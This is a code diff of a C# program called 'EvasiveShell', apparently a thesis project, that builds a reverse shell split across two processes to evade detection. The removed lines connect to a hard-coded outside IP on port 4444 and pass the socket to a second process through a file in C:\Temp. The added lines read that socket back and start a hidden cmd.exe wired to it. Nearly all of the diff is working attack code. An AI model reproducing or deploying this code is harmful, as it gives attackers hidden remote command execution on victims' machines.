@@ -1,11 +1,11 @@
-﻿namespace EvasiveShell
-{
-  using System.Diagnostics;
-  using System.Net.Sockets;
-  using System.Runtime.InteropServices;
-  using SocketHelpers;
+﻿using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System;
+using SocketHelpers;
 
-  public class Program
+namespace EvasiveShell_SocketConnection
+{
+  internal class Program
   {
     [StructLayout(LayoutKind.Sequential)]
     public struct sockaddr_in
@@ -67,8 +67,8 @@
     {
       public IntPtr hProcess;
       public IntPtr hThread;
-      public uint dwProcessId;
-      public uint dwThreadId;
+      public int dwProcessId;
+      public int dwThreadId;
     }
 
     public static class CreationFlags
@@ -90,18 +90,8 @@
     /// <param name="dwFlags">Kann NULL sein.</param>
     /// <returns></returns>
     [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);
+    public static extern IntPtr WSASocketA(int af, int type, int protocol, ref WSAPROTOCOL_INFO protocolInfo, int group, int dwFlags);
 
-    [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern ushort htons(ushort port);
-
-    [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern uint inet_addr(string ipAddress);
-
-    [DllImport("ws2_32.dll", SetLastError = true)]
-    private static extern int WSADuplicateSocket(IntPtr s, uint dwProcessId, ref WSAPROTOCOL_INFO lpProtocolInfo);
-
-    [StructLayout(LayoutKind.Sequential)]
     public struct WSAPROTOCOL_INFO
     {
       public uint dwServiceFlags1;
@@ -135,60 +125,56 @@
       public uint[] ChainEntries;
     }
 
-    public static void Main(string[] args)
+    static void Main(string[] args)
     {
       Helpers.InitializeWSA();
 
-      var sockAddrIn = new sockaddr_in();
-      sockAddrIn.sin_family = 2;
-      sockAddrIn.sin_port = htons(4444);
-      sockAddrIn.sin_addr.S_addr = inet_addr("172.104.237.62");
+      bool exists = false;
 
-      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
-      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
-      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
+      do
+      {
+        exists = File.Exists("C:\\Temp\\socketinfo.bin");
+        Thread.Sleep(20);
+      } 
+      while (!exists);
 
-      var protocolInfo = new WSAPROTOCOL_INFO();
-      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
-
-      if (connectSuccess != 0)
+      var serialized = File.ReadAllBytes("C:\\Temp\\socketinfo.bin");
+      var protocolInfo = DeserializeProtocolInfo(serialized);
+      IntPtr socket = WSASocketA(2, 1, 6, ref protocolInfo, 0, 0);
+      
+      if (socket == IntPtr.Zero)
         Environment.Exit(1);
 
+      var socketHandle = new SafeSocketHandle(socket, false);
       STARTUPINFO startupInfo = new STARTUPINFO();
       Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
       startupInfo.cb = Marshal.SizeOf(startupInfo);
       startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
+      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
+      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
+      startupInfo.hStdError = socketHandle.DangerousGetHandle();
 
       PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
-      CreateProcessA(null, @"F:\FH_Technikum_Wien\Masterarbeit\SimpleReverseShell\EvasiveShell_SocketConnection\bin\Debug\net6.0\EvasiveShell_SocketConnection.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
-      
-      Console.WriteLine("Connect success");
-      WSADuplicateSocket(socket, pinfo.dwProcessId, ref protocolInfo);
-      var serialized = SerializeProtocolInfo(protocolInfo);
-
-      if (!Directory.Exists("C:\\Temp"))
-        Directory.CreateDirectory("C:\\Temp");
-
-      File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);    
+      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
     }
 
-    private static byte[] SerializeProtocolInfo(WSAPROTOCOL_INFO protocolInfo)
+    private static WSAPROTOCOL_INFO DeserializeProtocolInfo(byte[] arr)
     {
+      WSAPROTOCOL_INFO protocolInfo = new WSAPROTOCOL_INFO();
       int size = Marshal.SizeOf(protocolInfo);
-      byte[] result = new byte[size];
       IntPtr ptr = Marshal.AllocHGlobal(size);
 
       try
       {
-        Marshal.StructureToPtr(protocolInfo, ptr, true);
-        Marshal.Copy(ptr, result, 0, size);
+        Marshal.Copy(arr, 0, ptr, size);
+        protocolInfo = Marshal.PtrToStructure<WSAPROTOCOL_INFO>(ptr);
       }
       finally
       {
         Marshal.FreeHGlobal(ptr);
       }
 
-      return result;
+      return protocolInfo;
     }
   }
 }
